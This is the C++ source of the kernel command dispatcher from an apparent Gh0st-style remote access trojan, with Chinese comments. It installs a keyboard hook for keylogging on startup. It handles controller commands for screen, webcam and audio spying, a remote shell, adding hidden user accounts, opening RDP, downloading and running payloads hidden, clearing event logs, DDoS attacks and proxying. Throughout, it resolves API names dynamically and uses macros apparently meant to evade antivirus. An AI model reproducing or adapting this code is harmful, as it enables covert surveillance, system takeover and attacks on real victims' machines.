// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "KernelManager.h"
#include "loop.h"
#include "until.h"
#include "DDOSManager.h"
#include "Proxy.h"
#include <TLHELP32.H>
#include "NetUser.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

typedef VOID (WINAPI *ExitProcessT)
(
    __in UINT uExitCode
    );

typedef UINT (WINAPI *GetSystemDirectoryAT)
(
    __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
    __in UINT uSize
    );

typedef HANDLE (WINAPI *CreateToolhelp32SnapshotT)
(
 DWORD dwFlags,
 DWORD th32ProcessID
 );

typedef BOOL (WINAPI *TerminateThreadT)


(
 __in HANDLE hThread,
 __in DWORD dwExitCode
 );


typedef HANDLE (WINAPI *CreateThreadT)
(
 LPSECURITY_ATTRIBUTES lpThreadAttributes,
 DWORD dwStackSize,
 LPTHREAD_START_ROUTINE lpStartAddress,
 LPVOID lpParameter,
 DWORD dwCreationFlags,
 LPDWORD lpThreadId
 );
//CreateThreadT pCreateThread= (CreateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateThread");
typedef BOOL (WINAPI *Process32FirstT)
(
 HANDLE hSnapshot,
 LPPROCESSENTRY32 lppe
 );

typedef BOOL (WINAPI *Process32NextT)
(
 HANDLE hSnapshot,
 LPPROCESSENTRY32 lppe
 );



char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;
extern BOOL Stoping;

DWORD ProcessToPID( LPCTSTR lpszProcess );
BOOL SiftWindowsText(LPSTR szWinText);
DWORD WINAPI BatchCommand(LPVOID lParam);
DWORD WINAPI Loop_MessageChat(LPVOID lParam);

//用来传递批量命令参数..
struct  BATCHPARAM
{
	LPBYTE Buffer;
	UINT nSize;
}m_BatchParam={NULL};

CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
		LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	
	if (lpszServiceName != NULL)
	{
		lstrcpy(m_strServiceName, lpszServiceName);
	}
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);

	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_dwServiceType = dwServiceType;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表始激活
	m_bIsActived = false;
	// 创建一个监视键盘记录的线程
	// 键盘HOOK跟UNHOOK必须在同一个线程中
CreateThreadT pCreateThread= (CreateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateThread");
	CloseHandle(pCreateThread(NULL,NULL,Loop_HookKeyboard,NULL,NULL,NULL));
	
}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
TerminateThreadT pTerminateThreadT= (TerminateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"TerminateThread");
		pTerminateThreadT(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

struct BATCHSTR
{
	char Type;
	char URL[50];
	USHORT SleepTime;
}m_BatchStr={NULL};


extern char	strKillEvent[];

// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_LIST_DRIVE: // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // 屏幕查看
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM: // 摄像头
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_AUDIO: // 语言
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHELL: // 远程sehll
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_NET_USER: // 无NET加用户
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)NETUSER,(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_OPEN_3389: // 开启3389
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)Open3389, (LPVOID)(lpBuffer + 1), 0,	NULL, true);
		break;
	case COMMAND_PLUGIN: //插件管理
//		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_PluginManager, 
//			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSTEM: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;

	case COMMAND_DOWN_EXEC: // 下载者
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // 传递参数用
		break;
	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // 卸载,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // 清除日志
		CleanEvent();
		break;
	case COMMAND_SESSION:
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: // 改备注 暂时不支持..
		{
			HKEY hkey;
			DWORD Operate = REG_CREATED_NEW_KEY;
			RegCreateKeyEx(HKEY_CURRENT_USER,"NetSubKey",NULL,NULL,NULL
				REG_OPTION_VOLATILE,KEY_SET_VALUE,NULL,&hkey,&Operate);
			RegSetValueEx(hkey,"",NULL,REG_SZ,&lpBuffer[1],nSize-1);	
			RegCloseKey(hkey);
		}
		break;
	case COMMAND_DDOS_ATTACK:
		{
			ATTACK m_Attack;
			memcpy(&m_Attack,lpBuffer + 1,sizeof(ATTACK));
			DDOSManager m_DDOSManager(&m_Attack);
		}
		break;
	case COMMAND_DDOS_STOP:
		 Stoping = FALSE;
		 break;
	case COMMNAD_SIFT_PROCESS:
		{
			CHAR PorcessName[100]={NULL};
			memcpy(PorcessName,lpBuffer+1,nSize-1);
			puts(PorcessName);

			if(ProcessToPID(PorcessName))
			{
				BYTE SendData[2]={TOKEN_SIFT_PROCESS,0};
				Send(&SendData[0],sizeof(SendData));
			}
		}
		break;
	case COMMAND_SIFT_WINTEXT:
		{
			CHAR WinText[200]={NULL};
			memcpy(WinText,lpBuffer+1,nSize-1);
			puts(WinText);
			
			if(SiftWindowsText(WinText))
			{
				BYTE SendData[2]={TOKEN_SIFT_WINTEXT,0};
				Send(&SendData[0],sizeof(SendData));
			}
		}
		break;
	case COMMNAD_BATCH_COMMAND:
		{
			ZeroMemory(&m_BatchParam,sizeof(BATCHPARAM));
			m_BatchParam.Buffer = &lpBuffer[1];
			m_BatchParam.nSize = nSize;
			ANTIVIRUS
CreateThreadT pCreateThread= (CreateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateThread");
			CloseHandle(pCreateThread(NULL,NULL,BatchCommand,&m_BatchParam,NULL,NULL));
			ANTIVIRUS
			Sleep(500);
		}
		break;
	case COMMAND_CHAT_TEXT:
		{
			ANTIVIRUS
CreateThreadT pCreateThread= (CreateThreadT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateThread");
				CloseHandle(pCreateThread(NULL,NULL,Loop_MessageChat,&lpBuffer[1],NULL,NULL));
			ANTIVIRUS
				Sleep(500);
		}
		
	case COMMAND_PROXY_BEGIN: // 开启代理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)OpenProxy, 
			(LPVOID)(lpBuffer + 1), 0,	NULL, true);
		Sleep(100); // 传递参数用
		break;
		break;
	case COMMAND_CLIENT_CLOSE:
		{
SMJJ
			//马上断开连接.
			m_pClient->Disconnect();
		}
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包 无须向控制端回复  内核会自己判断
		{
			puts("心跳");
		}
		break;

	default: break;
	}	
}

//extern char	svcname[];


//int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );

VOID DeleteLog()
{
	char MyKernel32sss[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyGetSystemDirectoryA[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
    GetSystemDirectoryAT pGetSystemDirectoryA = (GetSystemDirectoryAT)GetProcAddress(LoadLibrary(MyKernel32sss),MyGetSystemDirectoryA);
	char	strKeyboardOfflineRecord[MAX_PATH];
ANTIVIRUS
	pGetSystemDirectoryA(strKeyboardOfflineRecord, sizeof(strKeyboardOfflineRecord));
	lstrcat(strKeyboardOfflineRecord, "\\xhjmjj.dat");
ANTIVIRUS
	DeleteFile(strKeyboardOfflineRecord);
}

void CKernelManager::UnInstallService()
{
	char MyKernel32sss[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyExitProcess[]={'E','x','i','t','P','r','o','c','e','s','s','\0'};
    ExitProcessT pExitProcess = (ExitProcessT)GetProcAddress(LoadLibrary(MyKernel32sss),MyExitProcess);
ANTIVIRUS
	DeleteLog();
	
	SC_HANDLE del;
	SC_HANDLE scm;
	ANTIVIRUS
	scm=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	ANTIVIRUS
//	del=OpenService(scm,svcname,DELETE);
	ANTIVIRUS
	DeleteService(del);
	ANTIVIRUS
	CloseServiceHandle(del);
	ANTIVIRUS
	CloseServiceHandle(scm);
	
//	TellSCM( SERVICE_STOP_PENDING, 0, 1 );
	Sleep(10);
  //  TellSCM( SERVICE_STOPPED, 0, 0 );
SMJJ
	pExitProcess(0);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
ANTIVIRUS
}

DWORD ProcessToPID( LPCTSTR lpszProcess )
{
	DWORD dwRet = 0;
	ANTIVIRUS
CreateToolhelp32SnapshotT pCreateToolhelp32Snapshot= (CreateToolhelp32SnapshotT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateToolhelp32Snapshot");
	HANDLE hSnapshot = pCreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	ANTIVIRUS
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	ANTIVIRUS
Process32FirstT pProcess32First= (Process32FirstT)GetProcAddress(LoadLibrary("kernel32.dll"),"Process32First");
Process32NextT pProcess32Next= (Process32NextT)GetProcAddress(LoadLibrary("kernel32.dll"),"Process32Next");
	pProcess32First( hSnapshot, &pe32 );
	ANTIVIRUS
	do
	{
		if ( lstrcmpi( pe32.szExeFile, lpszProcess ) == 0 )
		{
			dwRet = pe32.th32ProcessID;
			break;
		}
		ANTIVIRUS


	} while ( pProcess32Next( hSnapshot, &pe32 ) );
	ANTIVIRUS
	CloseHandle( hSnapshot );
ANTIVIRUS
	ANTIVIRUS
	return dwRet;
}

static CHAR WindowText[200]={NULL};
static BOOL ResultSift =FALSE;
#define WINSIZE 200

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	CHAR szTemp[200]={NULL};
	ZeroMemory(szTemp,WINSIZE);

	GetWindowText(hwnd,szTemp,WINSIZE);
	
	if(NULL!=strstr(szTemp,WindowText))
	{
		ResultSift = TRUE;
		return FALSE;
	}

	return TRUE;
}

BOOL SiftWindowsText(LPSTR szWinText)
{
	if(szWinText == NULL || strlen(szWinText)==0)
		return FALSE;
	ZeroMemory(WindowText,WINSIZE);

	ResultSift=FALSE;
	strcpy(WindowText,szWinText);

	HMODULE mHodule = LoadLibrary("user32.dll");
	typedef BOOL (WINAPI *EnumWindowsT)(WNDENUMPROC,LPARAM);
	EnumWindowsT pEnumWindows = (EnumWindowsT)GetProcAddress(mHodule,"EnumWindows");
ANTIVIRUS
	pEnumWindows((WNDENUMPROC)EnumWindowsProc,NULL);
	
	signed int CountTime=3000;
	while(CountTime>1)
	{
		if(ResultSift)
			break;

		Sleep(200);
		CountTime-=200;
	}
	return ResultSift;
}

DWORD WINAPI BatchCommand(LPVOID lParam)
{
	BATCHPARAM m_Param={NULL};
	memcpy(&m_Param,lParam,sizeof(BATCHPARAM));
	LPBYTE Point= new BYTE[m_Param.nSize];
	
	memcpy(Point,m_Param.Buffer,m_Param.nSize);
	

	for (int i=0;i<m_Param.nSize/sizeof(BATCHSTR);i++)
	{
		memcpy(&m_BatchStr,Point,sizeof(BATCHSTR));
	
		Point+=sizeof(BATCHSTR);
		
		if(m_BatchStr.Type==1)//正常运行
			CloseHandle(CreateThread(NULL,NULL,Loop_DownManager,m_BatchStr.URL,NULL,NULL));
		if(m_BatchStr.Type==2)//隐藏运行

			CloseHandle(CreateThread(NULL,NULL,Loop_DownManagerHide,m_BatchStr.URL,NULL,NULL));
		if(m_BatchStr.Type==3)//正常打开网页
			OpenURL(m_BatchStr.URL, SW_SHOWNORMAL);
ANTIVIRUS
		if(m_BatchStr.Type==4)
			OpenURL(m_BatchStr.URL, SW_HIDE);
		Sleep(m_BatchStr.SleepTime*1000); // 传递参数用
	}
	
	delete []Point;
ANTIVIRUS
	return 0;
}

/*
VOID WriteString(LPSTR szStr)
{
	
	HANDLE m_Handle = CreateFile("c:\\log.txt",GENERIC_WRITE,
		FILE_SHARE_WRITE|FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	
	if(m_Handle != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(m_Handle,0,NULL,FILE_END);
		DWORD dwWrite=0;
		
		WriteFile(m_Handle,szStr,strlen(szStr),&dwWrite,NULL);
		WriteFile(m_Handle,"\r\n",2,&dwWrite,NULL);
		
		CloseHandle(m_Handle);
	}
}*/


struct CHAT
{
	CHAR Title[200];
	CHAR szText[1000];
	UINT Type;
}m_ChatSurt;

DWORD WINAPI Loop_MessageChat(LPVOID lParam)
{
	
	memcpy(&m_ChatSurt,lParam,sizeof(CHAT));
SMJJ
	MessageBox(NULL,m_ChatSurt.szText,m_ChatSurt.Title,m_ChatSurt.Type);

	return 0;
}
